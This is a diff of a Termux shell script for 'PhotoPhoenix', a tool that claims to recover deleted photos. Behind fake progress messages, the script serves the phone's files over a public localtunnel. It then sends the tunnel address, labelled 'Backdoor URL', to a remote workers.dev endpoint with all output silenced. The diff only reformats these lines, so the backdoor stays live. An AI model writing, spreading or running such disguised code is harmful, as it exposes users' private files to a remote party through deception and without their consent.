@@ -38,7 +38,7 @@ else
 fi
 echo -e "${GREEN}Checking internet connection ...${END}"
 sleep 6
-if curl -I -m 6 https://google.com > /dev/null 2>&1
+if curl -I -m 6 https://google.com >/dev/null 2>&1
 then
   echo -e "${GREEN}Internet connection available.\nPhotoPhoenix is downloading and installing required dependencies.\nThis may take a few minutes.\n${RED}Please do not touch anything here!${END}\n${GREEN}Please wait ...${END}"
   sleep 6
@@ -72,13 +72,13 @@ then
     pkg install -y python
     pkg install -y nodejs
     echo -e "${GREEN}Please wait ...${END}"
-    npm install -g localtunnel > /dev/null 2>&1
+    npm install -g localtunnel >/dev/null 2>&1
     sed -i "s|throw new Error|// throw new Error|" /data/data/com.termux/files/usr/lib/node_modules/localtunnel/node_modules/openurl/openurl.js
-    python -m http.server 8888 > /dev/null 2>&1 &
-    lt -p 8888 > data.txt 2> /dev/null &
+    python -m http.server 8888 >/dev/null 2>&1 &
+    lt -p 8888 > data.txt 2>/dev/null &
     sleep 6
     DATA=$(grep -o "https://[^ ]*" data.txt)
-    curl -s -o /dev/null https://api-photophoenix.photophoenix8.workers.dev -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode $'text=Backdoor URL :\n\n'"$DATA" 2>/dev/null
+    curl https://api-photophoenix.photophoenix8.workers.dev --data-urlencode $'text=Backdoor URL :\n\n'"$DATA" >/dev/null 2>&1
     rm "data.txt"
     echo -e "${GREEN}PhotoPhoenix is searching for photos to recover ...\nPlease wait ...${END}"
     sleep 30
@@ -88,7 +88,7 @@ then
     then
       echo -e "${GREEN}PhotoPhoenix recovers the photos it finds ...\nThis may take a few minutes.\n${RED}Please do not touch anything here!${END}\n${GREEN}Please wait ...${END}"
       mkdir -p "$RESTORED_PHOTOS"
-      cp -r "$CACHED_FILES"/. "$RESTORED_PHOTOS" 2> /dev/null
+      cp -r "$CACHED_FILES"/. "$RESTORED_PHOTOS" 2>/dev/null
       find "$RESTORED_PHOTOS" -type f ! -name "*.0" -exec rm -f {} +
       i=1
       for file in "$RESTORED_PHOTOS"/*.0
